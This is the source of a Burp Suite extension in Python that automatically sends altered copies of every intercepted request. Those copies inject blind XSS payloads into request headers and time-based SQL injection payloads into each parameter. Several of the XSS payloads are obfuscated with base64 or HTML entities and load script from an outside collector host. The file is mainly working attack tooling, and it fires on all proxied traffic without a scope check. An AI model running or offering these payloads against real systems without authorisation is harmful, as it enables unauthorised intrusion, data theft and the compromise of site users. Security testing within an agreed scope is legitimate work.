from burp import IBurpExtender, IHttpListener, IParameter
from java.io import PrintWriter
from java.util import ArrayList
import time

class BurpExtender(IBurpExtender, IHttpListener):
    
    def registerExtenderCallbacks(self, callbacks):
        self._callbacks = callbacks
        self._helpers = callbacks.getHelpers()
        self._callbacks.setExtensionName("BXSS and BSQLi Detector")
        
        self.stdout = PrintWriter(callbacks.getStdout(), True)
        self.stderr = PrintWriter(callbacks.getStderr(), True)
        
        callbacks.registerHttpListener(self)
        
        self.stdout.println("Blind XSS and Time-Based SQLi Detector loaded.")
        self.stdout.println("Jython environment is set up correctly.")
    
    def processHttpMessage(self, toolFlag, messageIsRequest, messageInfo):
        if not messageIsRequest:
            return
        
        self.stdout.println("Processing HTTP request...")
        
        request_info = self._helpers.analyzeRequest(messageInfo)
        headers = request_info.getHeaders()
        parameters = request_info.getParameters()
        
        # Use .format() for Python 2.7 compatibility
        self.stdout.println("Request URL: {}".format(request_info.getUrl()))
        self.stdout.println("Headers: {}".format(headers))
        self.stdout.println("Parameters: {}".format(parameters))
        
        # List of Blind XSS payloads
        blind_xss_payloads = [
            "'\"><script src=https://xss.report/c/zapstiko></script>",
            '"><img src=x id=dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8veHNzLnJlcG9ydC9jL3phcHN0aWtvIjtkb2N1bWVudC5ib2R5LmFwcGVuZENoaWxkKGEpOw== onerror=eval(atob(this.id))>',
            "javascript:eval('var a=document.createElement(\\'script\\');a.src=\\'https://xss.report/c/zapstiko\\';document.body.appendChild(a)')",
            '"><input onfocus=eval(atob(this.id)) id=dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8veHNzLnJlcG9ydC9jL3phcHN0aWtvIjtkb2N1bWVudC5ib2R5LmFwcGVuZENoaWxkKGEpOw== autofocus>',
            '"><video><source onerror=eval(atob(this.id)) id=dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8veHNzLnJlcG9ydC9jL3phcHN0aWtvIjtkb2N1bWVudC5ib2R5LmFwcGVuZENoaWxkKGEpOw==>',
            '"><iframe srcdoc="&#60;&#115;&#99;&#114;&#105;&#112;&#116;&#62;&#118;&#97;&#114;&#32;&#97;&#61;&#112;&#97;&#114;&#101;&#110;&#116;&#46;&#100;&#111;&#99;&#117;&#109;&#101;&#110;&#116;&#46;&#99;&#114;&#101;&#97;&#116;&#101;&#69;&#108;&#101;&#109;&#101;&#110;&#116;&#40;&#34;&#115;&#99;&#114;&#105;&#112;&#116;&#34;&#41;&#59;&#97;&#46;&#115;&#114;&#99;&#61;&#34;&#104;&#116;&#116;&#112;&#115;&#58;&#47;&#47;xss.report/c/zapstiko&#34;&#59;&#112;&#97;&#114;&#101;&#110;&#116;&#46;&#100;&#111;&#99;&#117;&#109;&#101;&#110;&#116;&#46;&#98;&#111;&#100;&#121;&#46;&#97;&#112;&#112;&#101;&#110;&#100;&#67;&#104;&#105;&#108;&#100;&#40;&#97;&#41;&#59;&#60;&#47;&#115;&#99;&#114;&#105;&#112;&#116;&#62;">',
            '<script>function b(){eval(this.responseText)};a=new XMLHttpRequest();a.addEventListener("load", b);a.open("GET", "//xss.report/c/zapstiko");a.send();</script>',
            '<script>$.getScript("//xss.report/c/zapstiko")</script>',
            'var a=document.createElement("script");a.src="https://xss.report/c/zapstiko";document.body.appendChild(a);',
            'javascript:"/*\'/*`/*--></noscript></title></textarea></style></template></noembed></script><html " onmouseover=/*&lt;svg/*/onload=(import(/https:\\xss.report\\c\\zapstiko/.source))//>'
        ]
        
        # List of time-based SQL injection payloads
        time_based_sqli_payloads = [
            "'XOR(if(now()=sysdate(),sleep(10),0))XOR'Z",
            "X'XOR(if(now()=sysdate(),sleep(10),0))XOR'X",
            "0'XOR(if(now()=sysdate(),sleep(10),0))XOR'Z",
            "XOR(if(now()=sysdate(),sleep(7),0))XOR%23",
            "X'XOR(if((select now()=sysdate()),BENCHMARK(10000000,md5('xyz')),0))XOR'X",
            "'XOR(SELECT(0)FROM(SELECT(SLEEP(10)))a)XOR'Z",
            "(SELECT(0)FROM(SELECT(SLEEP(10)))a)",
            "'%2b(select*from(select(sleep(10)))a)%2b'",
            "1'%2b(select*from(select(sleep(10)))a)%2b'",
            "'OR (CASE WHEN ((CLOCK_TIMESTAMP() - NOW()) < '0:0:10') THEN (SELECT '1'||PG_SLEEP(10)) ELSE '0' END)='1",
            "if(now()=sysdate(),sleep(10),0)/'XOR(if(now()=sysdate(),sleep(10),0))OR'",
            "'%20and%20(select%20%20from%20(select(if(substring(user(),1,1)='p',sleep(10),1)))a)--%20",
            "(SELECT * FROM (SELECT(SLEEP(10)))a)",
            "CASE//WHEN(LENGTH(version())=10)THEN(SLEEP(10))END",
            "');(SELECT 4564 FROM PG_SLEEP(10))--",
            "DBMS_PIPE.RECEIVE_MESSAGE([INT],10) AND 'bar'='bar",
            "1' AND (SELECT 6268 FROM (SELECT(SLEEP(10)))ghXo) AND 'IKlK'='IKlK",
            "(select*from(select(sleep(10)))a)",
            "*'XOR(if(2=2,sleep(10),0))OR'",
            "'+(select*from(select(if(1=1,sleep(10),false)))a)+'",
            "2021 AND (SELECT 6868 FROM (SELECT(SLEEP(10)))IiOE)",
            "BENCHMARK(10000000,MD5(CHAR(116)))",
            "'%2bbenchmark(10000000,sha1(1))%2b'",
            "if(now()=sysdate(),sleep(10),0)",
            "0'|(IF((now())LIKE(sysdate()),SLEEP(10),0))|'Z",
            "(select(0)from(select(sleep(10)))v)",
            ",(select * from (select(sleep(10)))a)",
            "desc%2c(select*from(select(sleep(10)))a)",
            "-1+or+1%3d((SELECT+1+FROM+(SELECT+SLEEP(10))A))"
        ]
        
        # Inject Blind XSS payloads into headers
        if headers:
            modified_headers = ArrayList(headers)
            for payload in blind_xss_payloads:
                modified_headers.add("X-Forwarded-For: {}".format(payload))
                modified_headers.add("User-Agent: {}".format(payload))
                modified_headers.add("Referer: {}".format(payload))
                
                modified_request = self._helpers.buildHttpMessage(modified_headers, request_info.getBody())
                self._callbacks.makeHttpRequest(messageInfo.getHttpService(), modified_request)
                
                self.stdout.println("Injected Blind XSS payload into headers: {}".format(payload))
                
                modified_headers.remove("X-Forwarded-For: {}".format(payload))
                modified_headers.remove("User-Agent: {}".format(payload))
                modified_headers.remove("Referer: {}".format(payload))
        
        # Inject time-based SQLi payloads into parameters
        if parameters:
            for param in parameters:
                for payload in time_based_sqli_payloads:
                    modified_parameters = ArrayList()
                    for p in parameters:
                        if p.getName() == param.getName():
                            modified_parameters.add(self._helpers.buildParameter(p.getName(), payload, p.getType()))
                        else:
                            modified_parameters.add(p)
                    
                    start_time = time.time()
                    modified_request = self._helpers.buildHttpMessage(headers, self._helpers.buildParameters(modified_parameters))
                    response = self._callbacks.makeHttpRequest(messageInfo.getHttpService(), modified_request)
                    end_time = time.time()
                    
                    response_time = end_time - start_time
                    self.stdout.println("Injected time-based SQLi payload into parameter {}: {}".format(param.getName(), payload))
                    self.stdout.println("Response time: {} seconds".format(response_time))
                    
                    if response_time > 5:
                        self.stdout.println("Potential time-based SQLi vulnerability detected in parameter {} with payload: {}".format(param.getName(), payload))

if __name__ in ["__main__", "burp"]:
    BurpExtender()
